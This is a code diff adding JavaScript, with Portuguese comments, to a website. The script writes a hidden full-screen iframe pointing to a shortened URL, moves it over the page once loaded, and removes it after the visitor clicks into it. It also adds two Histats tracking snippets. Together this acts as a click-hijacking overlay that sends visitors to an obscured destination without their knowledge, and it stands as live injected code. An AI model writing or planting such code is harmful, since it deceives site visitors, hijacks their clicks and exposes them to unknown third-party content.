@@ -1,0 +1,54 @@
+
+function createCookie(e,t,n){if(n){var o=new Date;o.setTime(o.getTime()+24*n*60*60*1e3);var i="; expires="+o.toGMTString()}else i="";document.cookie=e+"="+t+i+"; path=/"}function readCookie(e){for(var t=e+"=",n=document.cookie.split(";"),o=0;o <n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1,i.length);if(0==i.indexOf(t))return i.substring(t.length,i.length)}return null}function eraseCookie(e){createCookie(e,"",-1)}
+
+focus();
+
+// Função para mover a DIV para a posição desejada
+function moveAdToPosition() {
+    var adDiv = document.getElementById("AD_FLOAT");
+    if (adDiv) {
+        adDiv.style.top = "0px";
+        adDiv.style.left = "0px";
+    }
+}
+
+// Adiciona um ouvinte de evento para quando o iframe perder o foco
+var listener = addEventListener('blur', function() {
+    if (document.activeElement === document.getElementById('iAD_FLOAT')) {
+        //setTimeout(function() {
+            //window.top.location.reload();
+            document.getElementById("iAD_FLOAT").remove();
+        //}, 500); // 500 milissegundos
+    }
+});
+
+// Adiciona a DIV fora da tela
+document.write('<div id="AD_FLOAT" style="position:fixed;top:-100vh;left:-100vw;z-index:2000;"><iframe src="https://shorturl.at/s64rT" scrolling="no" frameborder="0" marginheight="0" marginwidth="0" id="iAD_FLOAT" style="height:100vh;width:100vw;"></iframe></div>');
+
+// Aguarda o carregamento do iframe para mover a DIV para a posição desejada
+document.addEventListener('DOMContentLoaded', function() {
+    var iframe = document.getElementById('iAD_FLOAT');
+    iframe.onload = function() {
+        moveAdToPosition();
+    };
+});
+		var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,3908301,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();
+var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,2998001,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();
+	
+	
